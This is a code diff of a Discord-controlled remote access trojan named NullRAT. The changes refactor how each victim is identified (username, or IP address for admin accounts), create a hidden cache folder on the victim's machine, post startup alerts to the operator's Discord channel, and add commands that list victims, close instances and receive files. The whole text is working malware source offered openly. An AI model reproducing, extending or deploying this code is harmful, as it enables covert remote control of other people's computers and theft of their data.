@@ -71,22 +71,23 @@ def find_token(self):
 ###################################################################
 
 original_dir = os.getcwd()
-if "dmin" in os.getenv("username"):
-    identifier = IP()
-else:
-    identifier = os.getenv("username") 
 
 class NullBot(commands.InteractionBot):
     def __init__(self, **options):
         super().__init__(**options)
-        self.ip_addr = ip_addr
+        self.ip_addr = IP()
         self.original_dir = original_dir
+        if "dmin" in os.getenv("username"):
+            self.identifier = self.ip_addr
+        else:
+            self.identifier = os.getenv("username") 
     
     genEmbed = genEmbed
     checked_embeds = checked_embeds
     find_token = find_token
         
 client = NullBot(test_guilds=server_ids)
+nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
@@ -96,8 +97,8 @@ if os.path.isdir(nr_working) != True:
 @client.event
 async def on_ready():
     embed = Embed(
-        title = f"NullRAT **IX** started on: **{identifier}**", 
-        description = f"Currently present in:\n```{original_dir}```",
+        title = f"NullRAT **IX** started on: **{client.identifier}**", 
+        description = f"Currently present in:\n```{client.original_dir}```",
         timestamp = datetime.now()
     ).set_author(
         name="NullCode1337", 
@@ -114,7 +115,7 @@ async def on_ready():
 async def listvictims(ctx):
     """Lists all victim identifiers accessible by NullRAT"""
     await ctx.channel.send( 
-        embed=discord.Embed(title=f"The identifier for {os.getenv('username')} is: {ip_addr}") 
+        embed=discord.Embed(title=f"The identifier for {os.getenv('username')} is: {client.identifier}") 
     )
     await ctx.response.send_message("__Checked all available victims:__")
 
@@ -136,8 +137,8 @@ async def close(ctx, victim):
         await client.close()
         
 @client.slash_command(description="Quits all instances of NullRAT")
-    """Shuts down all instances of NullRAT"""
 async def close_all(ctx):
+    """Shuts down all instances of NullRAT"""
     await ctx.response.send_message("Are you sure?", view=closeall_confirm())
     
 ############### Closing class 
@@ -160,12 +161,13 @@ class closeall_confirm(discord.ui.View):
         
 ############### Bot Extensions
 
-extensions = (
-    "Aa"
-)
+# extensions = (
+    # "Aa"
+# )
+client.load_extension("modules."+"receivefiles")
 
-for ex in extensions:
-    client.load_extension("modules."+"receivefiles")
+# for ex in extensions:
+    # client.load_extension("modules."+"receivefiles")
 
 ############### Bot Startup
 def is_connected():
